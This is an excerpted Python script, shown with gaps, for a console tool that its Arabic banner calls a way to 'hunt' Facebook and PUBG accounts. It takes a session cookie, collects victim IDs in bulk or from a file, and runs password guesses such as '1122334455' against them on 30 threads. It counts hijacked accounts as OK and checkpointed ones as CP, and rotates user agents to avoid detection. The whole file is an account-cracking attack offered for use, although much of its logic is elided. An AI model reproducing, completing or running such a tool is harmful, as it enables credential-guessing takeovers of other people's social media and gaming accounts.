...
code(Ch('    الجلاد حاكم الهكسوس لصيد حسابات فيس بوك وبوبجي')) 

#خلي بمكان Aegos اي شي تريده ينطب
...
# g= datetime.datetime(2023, 11, 8, 7, 10 ,9)
...
try:
	...
	print('[[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mWELCOME IN MY TOOLS BRO @KY_112 \n')
	code(Ch('    الجلاد حاكم الهكسوس لصيد حسابات فيس بوك وبوبجي')) 
...
def banner():
	...
	print(('—'*25)+'\n• اداه الجلاد حاكم الهكسوس لصيد حسابات فيس ربط تطبيقات •\n'+('—'*25))
...
def login_lagi334():
	try:
		...
		cookie=input(f'[➣_] 𝐈𝐍𝐏𝐔𝐓 𝐂𝐎𝐎𝐊𝐄 :{asu} ')
		...
		print(f'{asu}𝐋𝐎𝐆𝐈𝐍𝐄𝐃 𝐒𝐔𝐂𝐄𝐄𝐒 𝐑𝐔𝐍 𝐀𝐆𝐈𝐍');time.sleep(1)
...
def menu():
	...
	print("[ G1 ] تــࢪك")
	print("[ 2 ] 𝐂𝐑𝐀𝐂𝐊 𝐖𝐈𝐓𝐇 𝐅𝐈𝐋𝐄")
	print("[ 3 ] 𝐂𝐑𝐀𝐂𝐊 𝐖𝐈𝐓𝐇 𝐈𝐃")
	print('[ 0 ] 𝐋𝐎𝐆 𝐎𝐔𝐓')
	...
	if _____alvino__adijaya_____ in ['3']:
		...
		print(' 𝐒𝐔𝐂𝐄𝐄𝐒 𝐋𝐎𝐆𝐎𝐓𝐄𝐃 ')
		exit()
	else:
		print(' 𝐏𝐋𝐄𝐀𝐒𝐄 𝐂𝐇𝐎𝐈𝐒𝐄 𝐍𝐔𝐌𝐁𝐄𝐑 ')
		back()
def error():
	print(f'[ ! ] 𝐄𝐑𝐑𝐎𝐑 𝐍𝐎𝐓 𝐂𝐇𝐎𝐎𝐈𝐒𝐄𝐃')
	time.sleep(4)
	back()
#-----------------[ HASIL-CRACK ]-----------------#
def result():
...
def dump_massal():
	...
	for met in range(jum):
		yz+=1
		kl = input('   \033[2;32m[+]  \x1b[38;5;209m𝐈𝐃  '+str(yz)+' :\033[2;35m ')
...
#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
	print(f'[ 1 ] 𝐂𝐑𝐀𝐂𝐊 𝐎𝐋𝐃  𝐅𝐁')
	print('[ 2 ] 𝐂𝐑𝐀𝐂𝐊 𝐍𝐄𝐖 𝐅𝐁 ')
	print('[ 3 ] 𝐂𝐑𝐀𝐂𝐊 𝐑𝐀𝐍𝐃𝐎𝐌 𝐅𝐁 ')
	hu = input('\n[ ! ] 𝐂𝐇𝐎𝐈𝐂𝐄 : ')
	if hu in ['1','01']:
...
#	elif hc in ['4','04']:
		...
		method.append('mobile')
	print('')
	_jembot_ = input('[ + ] 𝐒𝐇𝐎𝐖 𝐀𝐏𝐏𝐒 (Y/T) :  ')
	if _jembot_ in ['']:
		print(' 𝐂𝐇𝐎𝐈𝐂𝐄 Y 𝐀𝐍𝐃 T ')
		back()
	elif _jembot_ in ['y','Y']:
		taplikasi.append('ya')
	else:
		taplikasi.append('no')
	pwplus=input('[ + ] 𝐀𝐔𝐓𝐎 𝐏𝐀𝐒𝐒𝐖𝐎𝐑𝐃  (Y/T) :  ')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		cetak(nel(' 1122334455,5544332211,..... '))
		pwku=input('[➣_] 𝐈𝐍𝐏𝐔𝐓 𝐏𝐀𝐒𝐒 : ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
...
def passwrd():
	...
	print(f'\033[92;1m𝐍𝐎𝐖 𝐒𝐓𝐑𝐀𝐓 𝐓𝐎 𝐂𝐑𝐀𝐂𝐊 𝐏𝐋𝐄𝐀𝐒𝐄 𝐖𝐈𝐓𝐄...\n')
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			...
			if 'mobile' in method:
				...
				pool.submit(crack,idf,pwv)
	print('')
	cetak(nel('\t[cyan]✓[green] 𝐂𝐑𝐀𝐂𝐊 𝐇𝐀𝐒 𝐂𝐎𝐌𝐏𝐋𝐄𝐓𝐄𝐃 [cyan] ✓[white] '))
	print(f'{h}[➣_] 𝐓𝐎𝐓𝐀𝐋𝐋 𝐎𝐊 : {h}%s '%(ok))
	print(f'{x}[➣_] 𝐓𝐎𝐓𝐀𝐋𝐋 𝐂𝐏 : {k}%s{x} '%(cp))
	print('')
	print(' 𝐘𝐎𝐔 𝐑𝐄𝐃𝐘 𝐓𝐎 𝐂𝐑𝐀𝐂𝐊 : (Y/T)')
	woi = input('[➣_] 𝐂𝐇𝐎𝐈𝐂𝐄: ')
	if woi in ['y','Y']:
		back()
	else:
		print(f'\t{x}[➣_] 𝐆𝐎𝐎𝐃 𝐁𝐀𝐘  ')
		time.sleep(2)
		exit()
#--------------------[ METODE-B-API ]-----------------#
os.system('clear');banner()
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r[ @KY_112 ]  {P}{b}{loop}{P}•{b}{len(id)}{P}  • OK:{P}{H}{ok}{P} •  CP:{P}{M}{cp}{P} • ({bo}{'{:.0%}'.format(loop/float(len(id)))}{asu})  "),
	sys.stdout.flush()
...
def crackfree(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\r[ @KY_112]  {P}{b}{loop}{P}•{b}{len(id)}{P}  • OK:{P}{H}{ok}{P} •  CP:{P}{M}{cp}{P} • ({bo}{'{:.0%}'.format(loop/float(len(id)))}{P})  "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					cetak(nel(statuscp1, title='@KY_112 CP'))
